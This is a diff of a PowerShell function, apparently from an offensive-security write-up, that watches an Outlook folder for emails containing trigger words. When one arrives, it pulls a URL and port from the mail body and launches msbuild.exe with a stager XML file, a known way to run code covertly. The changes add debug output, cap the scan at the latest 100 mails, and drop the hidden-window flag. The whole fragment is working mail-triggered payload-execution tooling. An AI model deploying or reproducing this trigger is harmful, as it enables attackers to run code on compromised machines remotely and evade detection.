@@ -92,11 +92,17 @@ function New-DynamicOutlookTrigger
             # Search the desired folder for a trigger email and execute
             $Folder = $ns.GetDefaultFolder($olFolderNumber)
             $Emails = $Folder.items
-            $Emails | foreach {
-                if($_.Body -match $Triggerwords[0] -and $_.Body -match $Triggerwords[1] -and $_.Body -match $Triggerwords[2])
+	    write-verbose $Emails
+	    write-verbose "start loop"
+	    $c = $Folder.items.Count
+            For ($i=$c; $i -gt $c-100; $i--) {
+		write-verbose "enter mail..."
+		write-output $Folder.items.Item($i).Body
+                if($Folder.items.Item($i).Body -match $Triggerwords[0] -and $Folder.items.Item($i).Body -match $Triggerwords[1] -and $Folder.items.Item($i).Body -match $Triggerwords[2])
                 {
+					write-verbose "found match"
                     # Section off the body of the targe email and format it for more efficient searching
-                    $EmailBody = $_.Body
+                    $EmailBody = $Folder.items.Item($i).Body
                     $Body = Out-String -InputObject $EmailBody
                     $formatted = $Body -split ' '
                     # Search the contents for a URL and for a number in the port range
@@ -116,10 +122,12 @@ function New-DynamicOutlookTrigger
                             $Port = $Portsection
                         }
                     }
-                    
-                    Start-Process -Window Hidden $payload -ArgumentList " $env:public\Libraries\msbuild_stager.xml"
+		    write-verbose "start payload"
+                    Start-Process $payload -ArgumentList " $env:public\Libraries\msbuild_stager.xml"
+		    break
                 }
             }
+	    write-verbose "start sleep"
             Start-sleep $Delay
         } 
     }
@@ -128,7 +136,7 @@ function New-DynamicOutlookTrigger
     }
 }
 
-New-DynamicOutlookTrigger -Triggerwords blabla1,blabla2,blabla3 -payload c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe -delay 30
+New-DynamicOutlookTrigger -Triggerwords word1,word2,word3 -payload c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe -delay 30 -verbose
 ```
 
 ## Outlook Prompt Bypass
